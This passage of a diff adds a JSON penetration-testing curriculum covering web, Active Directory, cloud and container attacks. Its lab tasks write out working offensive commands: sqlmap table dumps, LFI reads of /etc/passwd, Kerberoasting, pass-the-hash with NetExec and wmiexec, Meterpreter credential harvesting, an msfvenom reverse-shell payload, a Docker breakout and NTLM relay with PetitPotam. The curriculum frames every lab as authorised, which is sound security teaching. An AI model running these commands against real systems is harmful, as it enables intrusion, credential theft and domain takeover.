+          "tools": ["ffuf", "gobuster", "whatweb", "Nmap"],
+          "lab_task": "Build a complete attack-surface inventory of your lab range. Scan all hosts with Nmap, fingerprint web stacks with `whatweb http://192.168.56.101`, and brute-force content with `ffuf -u http://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302`. Enumerate virtual hosts with gobuster vhost mode. Produce a coverage table marking each asset tested or pending.",
+          "deliverable": "Attack-surface inventory with per-asset fingerprints and coverage status",
+          "checks": [["Run ffuf against the web root", "At least one directory or file returns HTTP 200, 301 or 302", "ffuf output"], ["Fingerprint a lab web host with whatweb", "The server and framework technologies are identified", "whatweb output"], ["Review the coverage table", "Every in-scope asset is marked tested or pending", "Inventory file"]],
+          "objectives": ["Consolidate reconnaissance into an asset inventory", "Discover content and virtual hosts on lab web apps", "Track testing coverage across the attack surface"]
+        },
+        {
+          "topic": "Nmap at Depth: Timing, Firewall and IDS Evasion in the Lab",
+          "subtopics": ["Timing templates T0 to T5 and their trade-offs", "Rate control with --min-rate and --max-rate", "Fragmentation, decoys and source-port tricks", "Detecting and reasoning about firewall filtering", "ACK scans and firewalk-style rule inference", "Scanning through a proxy or pivot accurately", "When evasion is counterproductive and noisy", "Detection angle: how IDS still catches evasive scans"],
+          "tools": ["Nmap", "Suricata", "Wireshark"],
+          "lab_task": "Against a lab host behind a host firewall with Suricata watching, compare a loud `nmap -T4 -sS` scan with an evasive `nmap -sS -T2 -f --data-length 25 -D RND:5 --source-port 53`. Use an ACK scan `nmap -sA` to infer filtered ports. Check Suricata fast.log after each. Record which scans were detected and conclude whether evasion helped.",
+          "deliverable": "Evasion comparison report with scan commands, results and Suricata alerts",
+          "checks": [["Run the ACK scan against the firewalled host", "Ports are classified as filtered or unfiltered", "nmap output"], ["Compare Suricata alerts for loud versus evasive scans", "The evasive scan produces fewer or different alerts", "Suricata log"], ["Verify open-port results from both scans", "Both scans agree on the set of open ports", "nmap output"]],
+          "objectives": ["Tune Nmap timing and evasion options", "Infer firewall rules from scan behaviour", "Judge when evasion helps against an IDS"]
+        },
+        {
+          "topic": "Burp Suite Intruder, Repeater and Extensions",
+          "subtopics": ["Intruder attack types: sniper, battering ram, pitchfork, cluster bomb", "Payload sets, processing rules and grep-match extraction", "Fuzzing parameters and brute-forcing with Intruder", "Macros and session-handling rules for authenticated testing", "Useful extensions from the BApp store", "Comparing responses to spot anomalies", "Throttling to respect lab stability", "Detection angle: request-rate and payload signatures a WAF flags"],
+          "tools": ["Burp Suite", "ffuf", "DVWA"],
+          "lab_task": "On a lab login form, run a Burp Intruder cluster-bomb attack across a small username and password list, using a grep-match to flag the success response. Configure a session-handling rule so an authenticated scan keeps its cookie. Add a BApp such as Logger++ and observe the traffic. Record which credential pair returned the distinct success length.",
+          "deliverable": "Intruder results table with the identified valid credentials and attack config",
+          "checks": [["Run the cluster-bomb attack on the login form", "One request returns a distinct status or length indicating success", "Intruder results"], ["Enable the session-handling rule and run an authenticated request", "The request carries a valid session cookie automatically", "Burp history"], ["Load the Logger++ extension and generate traffic", "Requests appear in the Logger++ view", "Extension output"]],
+          "objectives": ["Fuzz and brute-force with Burp Intruder", "Maintain authenticated sessions during testing", "Extend Burp with store extensions"]
+        },
+        {
+          "topic": "SQL Injection Exploitation and Data Extraction",
+          "subtopics": ["In-band, blind boolean and time-based injection types", "Enumerating schema, tables and columns manually", "Automating extraction and risk with sqlmap flags", "Reading and writing files where the DBMS allows it", "Stacked queries and secondary effects", "Bypassing simple filters and WAF rules", "Non-destructive proof versus damaging payloads", "Detection angle: SQL error logs and WAF alerts"],
+          "tools": ["sqlmap", "Burp Suite", "DVWA"],
+          "lab_task": "On a blind-injection lab endpoint, confirm a boolean-based injection manually, then use time-based with `' AND SLEEP(5)-- -` and observe the delay. Automate with `sqlmap -u '<url>?id=1' --batch --technique=BT --dump -T users`. Extract the users table and crack any hashes. Record the DBMS, extracted data counts and the proof query used, without altering data.",
+          "deliverable": "SQLi exploitation report with the technique, extracted data and proof queries",
+          "checks": [["Submit the time-based payload", "The response is delayed by roughly five seconds, confirming blind SQLi", "Timing evidence"], ["Run sqlmap --dump on the users table", "sqlmap extracts the table rows", "sqlmap output"], ["Confirm data integrity after testing", "No rows were modified or deleted during extraction", "Database check"]],
+          "objectives": ["Exploit blind and in-band SQL injection", "Extract schema and data with sqlmap safely", "Describe the server evidence SQLi leaves"]
+        },
+        {
+          "topic": "Server-Side Request Forgery and File Inclusion Testing",
+          "subtopics": ["Identifying SSRF sinks in URL and fetch parameters", "Reaching internal lab services and cloud metadata endpoints", "Local file inclusion and path traversal confirmation", "Remote file inclusion and log-poisoning to code execution", "PHP wrappers and filter chains for LFI", "Chaining SSRF or LFI toward remote code execution", "Blind SSRF confirmation with an out-of-band listener", "Detection angle: outbound request anomalies and WAF rules"],
+          "tools": ["Burp Suite", "ffuf", "DVWA"],
+          "lab_task": "On a lab app, confirm LFI by retrieving `/etc/passwd` through a path-traversal parameter, then escalate via PHP filter `php://filter/convert.base64-encode/resource=index.php`. Test SSRF by pointing a fetch parameter at an internal-only lab service and confirming the response. Use a local netcat listener for blind SSRF confirmation. Record each proof without reaching outside the lab.",
+          "deliverable": "SSRF and LFI findings with proof responses and exploitation chain notes",
+          "checks": [["Request /etc/passwd via the traversal parameter", "The file contents including root:x:0:0 are returned", "HTTP response"], ["Point the SSRF parameter at the internal lab service", "The internal service response is reflected back", "HTTP response"], ["Confirm blind SSRF with a netcat listener", "The listener receives an inbound connection from the target", "netcat output"]],
+          "objectives": ["Confirm and exploit SSRF against internal lab services", "Exploit LFI and traversal toward code execution", "Explain outbound-request detection of SSRF"]
+        },
+        {
+          "topic": "Authentication and Session Attacks on Lab Web Apps",
+          "subtopics": ["Credential stuffing and spraying against a lab login", "Weak password-reset and account-recovery flows", "Session fixation and predictable session tokens", "JWT weaknesses: alg none, weak secret, missing verification", "Multi-factor bypass patterns at a testing level", "Cookie flags: HttpOnly, Secure and SameSite", "Logic flaws in authentication state", "Detection angle: failed-login spikes and anomaly alerts"],
+          "tools": ["Burp Suite", "jwt_tool", "Hydra"],
+          "lab_task": "On a lab app using JWTs, capture a token and analyse it with `jwt_tool <token>`. Attempt an alg:none forgery and a weak-secret crack with `jwt_tool <token> -C -d rockyou.txt`. Test the login for user enumeration via differing error messages and spray with Hydra. Record which attacks succeed and whether cookie flags such as HttpOnly are set.",
+          "deliverable": "Auth findings report covering token, session and login weaknesses",
+          "checks": [["Run jwt_tool to crack the signing secret", "The HMAC secret is recovered from the wordlist", "jwt_tool output"], ["Submit a forged token with alg set to none", "The app accepts or rejects it, and the behaviour is recorded", "HTTP response"], ["Inspect the session cookie flags", "Whether HttpOnly, Secure and SameSite are set is documented", "Cookie inspection"]],
+          "objectives": ["Attack authentication and session management", "Identify and exploit JWT weaknesses", "Report login-attack detection opportunities"]
+        },
+        {
+          "topic": "Active Directory Enumeration with BloodHound",
+          "subtopics": ["Domain, forest, OU and trust fundamentals for testers", "Collecting data with SharpHound and the Python collector", "Importing data and reading the BloodHound graph", "Finding shortest paths to Domain Admins", "Identifying kerberoastable and AS-REP-roastable accounts", "Mapping ACL and group-membership abuse opportunities", "Marking owned principals to refine paths", "Detection angle: LDAP and SAMR query auditing"],
+          "tools": ["BloodHound", "SharpHound", "NetExec"],
+          "lab_task": "In a GOAD-style AD lab you own, collect graph data with `bloodhound-python -d lab.local -u user -p Pass -c All -ns 10.10.10.10`. Import into BloodHound and run the Shortest Path to Domain Admins query. Mark your foothold account as Owned. Identify at least one kerberoastable account and one ACL-based path. Record the attack path you will follow.",
+          "deliverable": "BloodHound findings with the shortest path to DA and a chosen attack path",
+          "checks": [["Run the Shortest Path to Domain Admins query", "BloodHound renders at least one viable path to Domain Admins", "BloodHound graph"], ["List kerberoastable accounts from the graph", "One or more accounts with an SPN are identified", "Query result"], ["Mark the foothold account as Owned", "The node is flagged Owned and path queries update", "BloodHound UI"]],
+          "objectives": ["Collect and import AD data into BloodHound", "Identify attack paths to Domain Admins", "Note the directory queries collection generates"]
+        },
+        {
+          "topic": "Kerberos Attacks: Kerberoasting and AS-REP Roasting in the Lab",
+          "subtopics": ["Kerberos authentication: AS-REQ, TGT and service tickets", "Kerberoasting SPN accounts and cracking the ticket", "AS-REP roasting accounts without pre-authentication", "Impacket GetUserSPNs and GetNPUsers workflows", "Cracking tickets with Hashcat modes 13100 and 18200", "Password-policy impact on crack feasibility", "Ticket-based attacks versus password attacks", "Detection angle: event 4769 and encryption-type anomalies"],
+          "tools": ["Impacket", "Hashcat", "NetExec"],
+          "lab_task": "In the AD lab, request service tickets with `impacket-GetUserSPNs lab.local/user:Pass -dc-ip 10.10.10.10 -request` and crack with `hashcat -m 13100 spns.txt rockyou.txt`. AS-REP roast with `impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip 10.10.10.10` and crack mode 18200. Record the recovered service-account passwords and note the Kerberos events generated.",
+          "deliverable": "Kerberos attack report with recovered credentials and event mapping",
+          "checks": [["Request SPN tickets with GetUserSPNs", "At least one Kerberos service ticket hash is returned", "Impacket output"], ["Crack the ticket with Hashcat mode 13100", "A service-account plaintext password is recovered", "hashcat output"], ["Check the DC security log during the attack", "Event 4769 service-ticket requests are recorded", "Event log"]],
+          "objectives": ["Perform Kerberoasting and AS-REP roasting", "Crack Kerberos tickets with Hashcat", "Map Kerberos attacks to detection events"]
+        },
+        {
+          "topic": "Lateral Movement and Credential Reuse in Windows Labs",
+          "subtopics": ["Dumping credentials and hashes from a foothold host", "Pass-the-hash and pass-the-ticket techniques", "Remote execution with wmiexec, psexec and smbexec", "NetExec for spraying credentials across the subnet", "Finding where an account is a local admin", "Harvesting cached and in-memory credentials", "Chaining moves toward higher-value hosts", "Detection angle: logon type 3, 4624/4625 and tool signatures"],
+          "tools": ["Impacket", "NetExec", "Mimikatz"],
+          "lab_task": "From a foothold in the AD lab, dump local hashes, then spray with `netexec smb 10.10.10.0/24 -u admin -H <hash>` to find where the account is local admin. Pass-the-hash into a new host with `impacket-wmiexec -hashes :<nt> admin@10.10.10.20` and confirm execution. Record the hosts reachable with the credential and the logon events generated.",
+          "deliverable": "Lateral-movement map showing credential reuse and reachable hosts",
+          "checks": [["Spray the hash across the subnet with NetExec", "NetExec flags Pwn3d! on at least one host", "NetExec output"], ["Pass-the-hash into a second host and run a command", "The command executes and returns the remote hostname", "wmiexec output"], ["Review logon events on a targeted host", "Event 4624 logon type 3 entries appear for the account", "Event log"]],
+          "objectives": ["Reuse credentials and hashes to move laterally", "Identify local-admin reach across the subnet", "Describe logon events lateral movement creates"]
+        },
+        {
+          "topic": "Metasploit Post-Exploitation and Meterpreter Pivoting",
+          "subtopics": ["Upgrading a shell to Meterpreter with sessions -u", "Post modules for enumeration and hashdump", "Migrating processes and maintaining a stable session", "Routing and port forwarding through the session", "Harvesting credentials with post/windows/gather modules", "Loading kiwi for in-memory credential access", "Cleaning up artefacts after testing", "Detection angle: injected processes and module signatures"],
+          "tools": ["Metasploit Framework", "Meterpreter", "Windows lab VM"],
+          "lab_task": "On a compromised lab Windows host, upgrade the shell with `sessions -u`, run `post/windows/gather/enum_logged_on_users` and `hashdump`. Load kiwi and run `creds_all`. Set up `portfwd add -l 3389 -p 3389 -r <internal>` to reach an internal host. Record the credentials gathered and the forwarded service reached, then remove any files you dropped.",
+          "deliverable": "Post-exploitation report with gathered credentials and pivot evidence",
+          "checks": [["Run hashdump in the Meterpreter session", "Local account NT hashes are returned", "Meterpreter output"], ["Load kiwi and run creds_all", "In-memory credentials or tickets are listed", "Meterpreter output"], ["Reach the internal service through portfwd", "The forwarded port connects to the internal host", "Connection test"]],
+          "objectives": ["Run Metasploit post-exploitation modules", "Harvest credentials and pivot with Meterpreter", "Identify the host artefacts post-exploitation leaves"]
+        },
+        {
+          "topic": "Payload Generation and Antivirus Evasion Awareness",
+          "subtopics": ["Generating payloads with msfvenom formats and encoders", "Staged versus stageless payloads and when each fits", "Why simple encoding no longer defeats modern AV", "Shellcode loaders and obfuscation at a conceptual level", "Testing detection against a lab AV, not VirusTotal", "Living-off-the-land binaries as an evasion approach", "Signed versus unsigned binary trust", "Detection angle: AMSI, EDR telemetry and behaviour analytics"],
+          "tools": ["msfvenom", "Metasploit Framework", "Windows Defender (lab)"],
+          "lab_task": "Generate a Windows reverse-shell payload with `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe`. Run it against a lab host with Defender enabled and observe detection. Regenerate with an encoder and a template, test again, and record detection results. Note which behaviours EDR would flag regardless of static evasion.",
+          "deliverable": "Payload-evasion notes comparing detection across generation methods",
+          "checks": [["Drop the raw msfvenom payload on the Defender host", "Defender quarantines or alerts on the file", "Defender log"], ["Start the matching multi/handler and run a surviving payload", "A Meterpreter session is established", "msfconsole log"], ["Review EDR behavioural telemetry", "Process-injection or network-callback behaviour is recorded", "EDR telemetry"]],
+          "objectives": ["Generate and deliver payloads with msfvenom", "Test static evasion against a lab AV", "Explain why behavioural EDR still detects payloads"]
+        },
+        {
+          "topic": "Linux Post-Exploitation and Persistence in the Lab",
+          "subtopics": ["Situational awareness on a compromised Linux host", "Harvesting SSH keys, tokens and config secrets", "Persistence via cron, systemd units and authorized_keys", "Pivoting data collection across the environment", "Abusing capabilities and container breakouts briefly", "Cleaning persistence after the test", "Mapping discovered secrets to further access", "Detection angle: file-integrity and audit monitoring"],
+          "tools": ["LinPEAS", "pspy", "Kali Linux"],
+          "lab_task": "On a rooted lab Linux host, gather SSH keys and service credentials, watch for cron activity with pspy, and establish persistence by adding your key to authorized_keys and a systemd timer. Reconnect using the persistence to prove it. Document every change made, then remove all persistence and confirm with `systemctl list-timers`. Note the audit events each change raises.",
+          "deliverable": "Linux post-exploitation report with persistence proof and cleanup confirmation",
+          "checks": [["Reconnect using the planted authorized_keys entry", "SSH access succeeds without a password", "SSH session"], ["Observe scheduled jobs with pspy", "A running cron or timer process is captured", "pspy output"], ["Run cleanup then list timers", "The planted systemd timer no longer appears", "systemctl output"]],
+          "objectives": ["Gather secrets and establish Linux persistence", "Prove and then cleanly remove persistence", "Describe audit detection of persistence changes"]
+        },
+        {
+          "topic": "Cloud Penetration Testing on a Learner-Owned AWS Account",
+          "subtopics": ["Cloud testing rules and provider policy at an awareness level", "Enumerating IAM users, roles and policies you own", "Finding exposed S3 buckets and misconfigured permissions", "Abusing over-permissive IAM for privilege escalation paths", "Instance metadata (IMDSv1 versus IMDSv2) and SSRF to credentials", "Scanning with Prowler and ScoutSuite", "Keeping all testing inside your own account and scope", "Detection angle: CloudTrail and GuardDuty findings"],
+          "tools": ["AWS CLI", "Prowler", "ScoutSuite", "pacu"],
+          "lab_task": "In an AWS account you own, run `prowler aws` and review findings. Enumerate your identity with `aws sts get-caller-identity` and list IAM permissions. Identify a privilege-escalation path (for example iam:PassRole) and demonstrate it with Pacu in your sandbox. Check an S3 bucket policy for public access. Record findings and confirm CloudTrail logged the activity.",
+          "deliverable": "Cloud findings report with IAM paths, S3 issues and CloudTrail evidence",
+          "checks": [["Run prowler against the owned account", "A report of passed and failed checks is produced", "Prowler output"], ["Demonstrate the IAM privilege-escalation path in Pacu", "Elevated permissions are obtained within the sandbox account", "Pacu output"], ["Review CloudTrail for the test actions", "The API calls made during testing appear in CloudTrail", "CloudTrail log"]],
+          "objectives": ["Assess IAM and S3 in an owned AWS account", "Demonstrate a cloud privilege-escalation path safely", "Verify cloud-native detection of testing"]
+        },
+        {
+          "topic": "Container and Docker Security Testing in the Lab",
+          "subtopics": ["Finding exposed Docker APIs and registries", "Enumerating images and layers for secrets", "Privileged containers and dangerous mounts", "Breaking out of a container to the host", "Abusing the Docker socket for host compromise", "Scanning images with Trivy for known CVEs", "Hardening recommendations for the report", "Detection angle: runtime monitoring and audit of container escapes"],
+          "tools": ["Docker", "Trivy", "Kali Linux"],
+          "lab_task": "In a lab, find an exposed Docker daemon and list containers with `docker -H tcp://10.10.10.30:2375 ps`. Launch a privileged container mounting the host filesystem to read `/etc/shadow` from the host. Scan a lab image with `trivy image vulnapp:latest`. Demonstrate a Docker-socket breakout. Record each escape path and the hardening that would prevent it.",
+          "deliverable": "Container testing report with breakout proof and hardening guidance",
+          "checks": [["List containers via the exposed Docker API", "Running containers on the remote daemon are listed", "docker output"], ["Mount the host filesystem from a privileged container", "Host files such as /etc/shadow are readable", "Container shell"], ["Scan the lab image with Trivy", "Trivy reports the image CVEs by severity", "trivy output"]],
+          "objectives": ["Attack exposed Docker daemons and images", "Break out of a container to the host", "Recommend container hardening and detection"]
+        },
+        {
+          "topic": "API Penetration Testing: REST and Token Abuse",
+          "subtopics": ["Discovering endpoints from docs, OpenAPI and traffic", "Broken object-level authorisation (BOLA/IDOR) testing", "Broken function-level authorisation and mass assignment", "Token handling: bearer tokens, scopes and expiry", "Rate limiting, enumeration and resource abuse", "Fuzzing API parameters with ffuf and Burp", "Chaining API flaws toward data exposure", "Detection angle: API gateway logs and anomaly rules"],
+          "tools": ["Burp Suite", "Postman", "ffuf"],
+          "lab_task": "Against a lab REST API, import its OpenAPI spec into Postman and map endpoints. Test IDOR by changing an object id in `GET /api/users/{id}` with another user's token and observe access. Try mass assignment by adding `\"role\":\"admin\"` to a profile update. Fuzz an id parameter with ffuf. Record each authorisation flaw and the gateway log entries produced.",
+          "deliverable": "API findings report covering IDOR, mass assignment and token issues",
+          "checks": [["Request another user's object with your token", "The API returns data you should not be authorised to see", "HTTP response"], ["Submit a profile update adding a role field", "The response reflects whether mass assignment succeeded", "HTTP response"], ["Fuzz the id parameter with ffuf", "Valid and invalid ids are distinguished by status or length", "ffuf output"]],
+          "objectives": ["Discover and test REST API endpoints", "Exploit authorisation flaws and token abuse", "Identify API-gateway detection signals"]
+        },
+        {
+          "topic": "Detection Engineering: Mapping Attacks to MITRE ATT&CK",
+          "subtopics": ["Translating each engagement step into an ATT&CK technique", "Collecting telemetry from Sysmon and Windows event logs", "Shipping logs to a lab SIEM such as Elastic or Wazuh", "Writing a detection for a technique you executed", "Testing the detection by replaying the attack", "Measuring detection coverage across the kill chain", "Feeding detection gaps into the report", "Purple-team collaboration mindset"],
+          "tools": ["Sysmon", "Wazuh", "MITRE ATT&CK Navigator"],
+          "lab_task": "Install Sysmon on a lab host and ship logs to a Wazuh/Elastic stack. Re-run a Kerberoasting and a lateral-movement attack. Write a detection rule for one technique (for example flag event 4769 with RC4 encryption). Replay the attack and confirm the alert fires. Colour an ATT&CK Navigator layer by detection coverage and record the gaps.",
+          "deliverable": "Detection rules, a fired-alert screenshot and an ATT&CK coverage layer",
+          "checks": [["Replay the attack after deploying the rule", "The detection rule fires an alert in the SIEM", "SIEM alert"], ["Review the Sysmon logs for the attack", "Process-creation or network events for the attack are present", "Sysmon log"], ["Open the ATT&CK coverage layer", "Techniques are coloured by detected or undetected status", "Navigator layer"]],
+          "objectives": ["Map engagement activity to ATT&CK techniques", "Build and test a detection in a lab SIEM", "Report detection coverage and gaps"]
+        },
+        {
+          "topic": "Remediation Retesting and Verification Workflow",
+          "subtopics": ["Defining retest scope from the original findings", "Verifying each fix reproduces no longer", "Regression risk: fixes that break something else", "Partial fixes and compensating controls", "Updating finding status: fixed, partial, open", "Evidence capture for the retest report", "Communicating residual risk to the client", "Detection angle: confirming new monitoring is in place"],
+          "tools": ["Nmap", "Burp Suite", "Markdown editor"],
+          "lab_task": "After a lab owner applies fixes, retest the three findings from a prior engagement. Attempt the original exploit for each and record whether it still works. For a fixed SQLi, confirm the payload now fails; for a patched service, confirm the version changed. Update each finding status and residual risk. Verify any new detection rule fires. Produce a retest report.",
+          "deliverable": "Retest report with per-finding status, evidence and residual risk",
+          "checks": [["Re-run the original SQLi payload against the fixed app", "The injection no longer returns data", "HTTP response"], ["Re-scan the patched service with Nmap", "The reported service version reflects the patch", "nmap output"], ["Review the updated findings table", "Each finding is marked fixed, partial or open with evidence", "Retest report"]],
+          "objectives": ["Scope and run a remediation retest", "Verify fixes and capture residual risk", "Confirm new detections are operating"]
+        },
+        {
+          "topic": "Professional Reporting with CVSS 4.0 Vectors",
+          "subtopics": ["CVSS 4.0 base, threat, environmental and supplemental metrics", "Building defensible vector strings for each finding", "Severity bands and how they drive prioritisation", "Environmental scoring for the client's real context", "Writing clear reproduction steps and impact narratives", "Executive versus technical audiences in one report", "Consistent evidence, screenshots and appendices", "Quality review before delivery"],
+          "tools": ["CVSS 4.0 calculator", "Markdown editor", "Pandoc"],
+          "lab_task": "Take five findings from your lab engagements and score each with a full CVSS 4.0 base vector, then adjust with environmental metrics for a stated client context. Write defensible reproduction steps and an impact narrative for the top finding. Assemble a report with an executive summary and technical detail. Export with Pandoc and have a peer review the scoring rationale.",
+          "deliverable": "Polished report with five CVSS 4.0 scored findings and peer-review notes",
+          "checks": [["Build the CVSS 4.0 vector for the top finding", "A complete CVSS:4.0 vector string and score are recorded", "Calculator output"], ["Apply environmental metrics for the client context", "The environmental score differs from the base score where justified", "Scoring notes"], ["Have a peer review the report", "The reviewer confirms each score has a written rationale", "Review notes"]],
+          "objectives": ["Score findings with full CVSS 4.0 vectors", "Adjust scores for client environmental context", "Deliver a review-ready professional report"]
+        },
+        {
+          "topic": "Intermediate Capstone: Internal Network Pentest of a Lab AD Range",
+          "subtopics": ["Scoping and confirming authorisation for the AD range", "Foothold, enumeration and BloodHound path selection", "Kerberos attacks and lateral movement to Domain Admin", "Evidence capture and CVSS 4.0 scoring throughout", "Detection mapping and a purple-team debrief", "Delivering a report with remediation and retest plan"],
+          "tools": ["BloodHound", "Impacket", "NetExec", "Metasploit Framework"],
+          "lab_task": "Run an internal pentest of your authorised AD lab from an assumed foothold: enumerate with BloodHound, Kerberoast, move laterally and reach Domain Admin, capturing a domain-level proof. Record ATT&CK techniques and the detections each would trigger. Deliver a report with CVSS 4.0 findings, remediation and a retest plan. Confirm only the authorised lab range was touched.",
+          "deliverable": "Full internal-pentest package: evidence, DA proof, report and detection map",
+          "checks": [["Follow the path from foothold to Domain Admin", "A Domain Admin or domain-level proof is obtained", "Proof evidence"], ["Review the report findings", "Each finding has a CVSS 4.0 vector, remediation and detection note", "Report file"], ["Check the engagement activity log", "All activity stayed within the authorised lab range", "Activity log"]],
+          "objectives": ["Run an internal AD pentest end to end", "Reach domain compromise with documented paths", "Deliver report, detection map and retest plan"]
+        }
+      ]
+    },
+    "advanced": {
+      "summary": "For experienced testers moving toward red-team-style and specialist work inside complex, authorised labs. It covers objective-based operations with OPSEC and deconfliction, advanced Active Directory attack paths, AD Certificate Services abuse, delegation and trust attacks across forests, NTLM relay and coercion, command-and-control infrastructure, advanced web exploitation, exploit development, endpoint-detection bypass, deep pivoting, Linux kernel and container escapes, cloud and Kubernetes attack paths, WPA2-Enterprise wireless, purple teaming, exfiltration simulation, breach-and-attack-simulation automation and threat-informed risk reporting. All work stays within the learner-owned lab estate and validates detections alongside each attack.",
+      "prerequisites": ["Completed the intermediate track or can independently compromise a lab AD domain and test web, cloud and container targets", "Fluent with Impacket, BloodHound, Metasploit and PowerShell tradecraft, and comfortable reading detection telemetry", "Owns a complex multi-forest lab (for example GOAD plus cloud and Kubernetes ranges) with full authorisation to attack it"],
+      "outcomes": ["Plan and run red-team-style operations within authorised lab boundaries with deconfliction and OPSEC", "Chain advanced Active Directory, certificate and trust attacks to compromise a lab forest", "Develop and test evasion, C2 and exploitation tradecraft against lab defences and validate detections", "Run purple-team and breach-and-attack-simulation exercises and report risk against a maturity model"],
+      "days": [
+        {
+          "topic": "Red-Team-Style Operations Within Authorised Lab Boundaries",
+          "subtopics": ["Objective-based testing versus vulnerability enumeration", "Defining crown-jewel objectives and engagement rules", "Operations planning, phasing and deconfliction with the blue team", "OPSEC discipline and avoiding unnecessary noise", "Logging operator actions for later purple-team review", "Scope control and stop conditions for intrusive actions", "Threat-actor emulation at a planning level", "Detection angle: planning detections alongside each objective"],
+          "tools": ["MITRE ATT&CK Navigator", "Markdown editor", "Draw.io"],
+          "lab_task": "Design a red-team-style operation for your lab with a crown-jewel objective (for example read a specific file on a segmented host). Write an operations plan with phases, OPSEC rules, deconfliction contacts and stop conditions. Map each phase to ATT&CK and pre-agree detections with a blue-team partner. State that the operation runs only against the authorised lab estate.",
+          "deliverable": "Operations plan with objectives, phasing, OPSEC rules and deconfliction",
+          "checks": [["Review the operations plan phases", "Each phase has an objective, OPSEC note and stop condition", "Operations plan"], ["Check the deconfliction section", "Blue-team contacts and a deconfliction process are defined", "Operations plan"], ["Confirm the scope statement", "The plan limits activity to the authorised lab estate", "Operations plan"]],
+          "objectives": ["Plan an objective-based red-team-style operation", "Apply OPSEC and deconfliction discipline", "Pre-agree detections with a blue team"]
+        },
+        {
+          "topic": "Advanced Active Directory Attack Paths with BloodHound",
+          "subtopics": ["Analysing complex ACL chains in BloodHound", "GenericAll, WriteDACL and ForceChangePassword abuse", "Shadow Credentials via msDS-KeyCredentialLink", "Resource-based constrained delegation attacks", "GPO abuse for code execution", "Custom Cypher queries for bespoke paths", "Prioritising the quietest viable path", "Detection angle: directory-change and GPO audit events"],
+          "tools": ["BloodHound", "PowerView", "Whisker"],
+          "lab_task": "In the AD lab, use BloodHound with a custom Cypher query to find an ACL path to a high-value object. Abuse a GenericAll or WriteDACL edge (for example with PowerView `Add-DomainObjectAcl`), then perform a Shadow Credentials attack with Whisker to obtain a TGT. Reach the target object. Record the edge abused, the quietest path and the directory events generated.",
+          "deliverable": "Advanced AD path write-up with the abused edges and resulting access",
+          "checks": [["Run the custom Cypher query in BloodHound", "A non-obvious ACL path to the target is returned", "BloodHound result"], ["Abuse the ACL edge and obtain access", "Control of the target principal or object is achieved", "Command output"], ["Review directory-change auditing", "The ACL or key modification is recorded in the DC logs", "Event log"]],
+          "objectives": ["Analyse and abuse complex AD ACL chains", "Execute Shadow Credentials and delegation attacks", "Identify directory auditing of these attacks"]
+        },
+        {
+          "topic": "Abusing AD Certificate Services in the Lab",
+          "subtopics": ["AD CS components: CA, templates and enrolment", "Enumerating vulnerable templates with Certify and Certipy", "ESC1 to ESC8 misconfiguration families", "Requesting certificates for privilege escalation", "Using certificates for authentication and persistence", "NTLM relay to the web enrolment endpoint (ESC8)", "Hardening and template remediation guidance", "Detection angle: certificate issuance and 4886/4887 events"],
+          "tools": ["Certipy", "Certify", "Impacket"],
+          "lab_task": "Enumerate AD CS in the lab with `certipy find -u user@lab.local -p Pass -dc-ip 10.10.10.10 -vulnerable`. Identify an ESC1 template, request a certificate for a privileged user with `certipy req`, and authenticate to obtain a TGT and NT hash with `certipy auth`. Record the vulnerable template, the escalation achieved and the certificate-issuance events a defender would see.",
+          "deliverable": "AD CS attack report with the vulnerable template and escalation proof",
+          "checks": [["Run certipy find with the vulnerable flag", "At least one ESC-vulnerable template is identified", "certipy output"], ["Request and authenticate with the certificate", "A TGT or NT hash for the privileged account is obtained", "certipy output"], ["Review CA issuance logs", "Certificate-request events such as 4886/4887 are recorded", "Event log"]],
+          "objectives": ["Enumerate vulnerable AD CS templates", "Exploit an ESC misconfiguration for escalation", "Describe certificate-issuance detection"]
+        },
+        {
+          "topic": "Delegation and Trust Attacks Across Lab Forests",
+          "subtopics": ["Unconstrained, constrained and resource-based delegation", "Abusing delegation to impersonate privileged users", "Forest and domain trust direction and transitivity", "SID history and cross-domain escalation", "Golden and diamond ticket concepts in a lab", "Crossing a trust to a second lab forest", "Trust-attack remediation and tiering", "Detection angle: anomalous TGS and trust-auth events"],
+          "tools": ["Impacket", "Rubeus", "mimikatz"],
+          "lab_task": "In a two-forest lab, enumerate trusts and delegation. Abuse a constrained-delegation account with Rubeus s4u to impersonate a privileged user on a target service. Across a trust, use SID history or a forged ticket (lab-only) to access a resource in the second forest. Record the delegation abused, the cross-forest access gained and the Kerberos events generated.",
+          "deliverable": "Delegation and trust attack report with cross-forest access proof",
+          "checks": [["Run Rubeus s4u against the delegation account", "A service ticket impersonating the target user is obtained", "Rubeus output"], ["Access a resource in the second forest", "Cross-forest access to the target resource succeeds", "Command output"], ["Review TGS requests during the attack", "Anomalous service-ticket events are recorded on the DCs", "Event log"]],
+          "objectives": ["Abuse Kerberos delegation to impersonate users", "Escalate across a lab forest trust", "Identify detection of delegation and trust abuse"]
+        },
+        {
+          "topic": "NTLM Relay and Coercion Techniques in the Lab",
+          "subtopics": ["NTLM authentication and why relaying works", "Coercion with PetitPotam, PrinterBug and DFSCoerce", "Relaying to LDAP, SMB and AD CS web enrolment", "SMB signing and channel binding as defences", "Chaining coercion to domain escalation", "ntlmrelayx configuration and targets file", "Mitigations: EPA, signing and patching", "Detection angle: relay patterns and authentication anomalies"],
+          "tools": ["Impacket", "PetitPotam", "Responder"],
+          "lab_task": "In the lab, start `impacket-ntlmrelayx -t ldap://dc.lab.local --escalate-user user` then coerce the DC with PetitPotam to authenticate to your host. Relay the authentication to escalate. Alternatively relay to AD CS web enrolment (ESC8) to obtain a certificate. Record the coercion method, the relay target and the escalation, plus whether SMB signing blocked any path.",
+          "deliverable": "Relay and coercion report with the chain used and escalation proof",
+          "checks": [["Coerce authentication with PetitPotam to your relay", "The target account authenticates to the relay host", "ntlmrelayx log"], ["Relay the authentication to the configured target", "The relay escalates privileges or issues a certificate", "ntlmrelayx log"], ["Test a host with SMB signing required", "The relay to that host fails, confirming the mitigation", "ntlmrelayx log"]],
+          "objectives": ["Coerce and relay NTLM authentication", "Chain relaying to domain escalation", "Demonstrate signing and EPA mitigations"]
+        },
+        {
+          "topic": "Command-and-Control Infrastructure for Lab Exercises",
